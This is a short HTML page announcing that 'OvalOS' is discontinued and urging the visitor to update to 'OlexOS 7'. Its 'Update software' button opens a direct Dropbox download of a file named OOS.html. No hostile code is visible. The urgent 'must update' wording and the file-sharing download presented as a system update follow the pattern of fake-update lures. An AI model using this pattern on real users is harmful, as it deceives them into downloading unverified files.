<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>System Update</title>
  <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;700&display=swap" rel="stylesheet">
  <style>
    body {
      margin: 0;
      font-family: 'DM Sans', sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      background: #fff;
      color: #4a4a4a;
    }

    .container {
      text-align: center;
      max-width: 420px;
      padding: 0 16px;
    }

    h1 {
      font-size: 24px;
      font-weight: 700;
      margin-bottom: 24px; 
      color: #333;
    }

    p {
      font-size: 16px;
      line-height: 1.6;
      margin: 0 0 20px;
    }

    a {
      color: #009ecb;
      text-decoration: none;
    }

    a:hover {
      text-decoration: underline;
    }

    .button {
      margin-top: 30px;
      background: #4285f4;
      color: white;
      border: none;
      font-size: 16px;
      font-weight: 500;
      padding: 14px 24px;
      border-radius: 999px;
      cursor: pointer;
      transition: background 0.3s ease;
    }

    .button:hover {
      background: #3367d6;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Important System update required!</h1>
    <p>OvalOS has been discontinued and is no longer receiving updates, you must update your software to OlexOS 7.</p>
    <p>
      For more information go to<br>
      <a href="https://www.jacsyn.com/oval-discontinuation" target="_blank">https://www.jacsyn.com/oval-discontinuation</a>
    </p>
    <button onclick="window.open('https://www.dl.dropboxusercontent.com/scl/fi/scoqyguv00zl9s5ni7zwg/OOS.html?rlkey=06vwbaq22kxw39gmre2lr48fs&st=aczy60qt&dl=1');" class="button">Update software</button>
  </div>
</body>
</html>
